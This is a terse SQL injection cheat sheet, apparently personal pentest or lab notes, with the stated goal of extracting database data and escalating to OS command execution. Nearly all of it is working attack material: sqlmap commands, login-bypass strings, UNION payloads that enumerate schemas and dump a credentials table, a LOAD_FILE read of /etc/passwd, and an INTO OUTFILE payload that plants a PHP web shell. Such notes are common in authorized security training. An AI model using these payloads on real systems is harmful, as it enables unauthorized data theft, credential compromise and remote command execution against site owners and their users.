# SQL Injection

Goal: Extract database data and escalate to OS command execution.

---

# SQLMap Basics

sqlmap -h

sqlmap -hh

sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

sqlmap -r req.txt

sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

sqlmap -u www.target.com --data='id=1' --method PUT

sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

---

# Manual SQL Injection

admin' or '1'='1

admin')-- -

' order by 1-- -

cn' UNION select 1,2,3-- -

cn' UNION select 1,@@version,3,4-- -

UNION select username, 2, 3, 4 from passwords-- -

SELECT @@version

SELECT SLEEP(5)

cn' UNION select 1,database(),2,3-- -

cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

cn' UNION select 1, username, password, 4 from dev.credentials-- -

cn' UNION SELECT 1, user(), 3, 4-- -

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

select 'file written successfully!' into outfile '/var/www/html/proof.txt'

cn' union select "",'<?php system($_REQUEST[0]); ?>',"", "" into outfile '/var/www/html/shell.php'-- -

---

# Tactical Notes

- Determine column count first.
- Enumerate DB → tables → columns → data.
- Check for file read/write privileges.
- Attempt web shell write if file privileges exist.
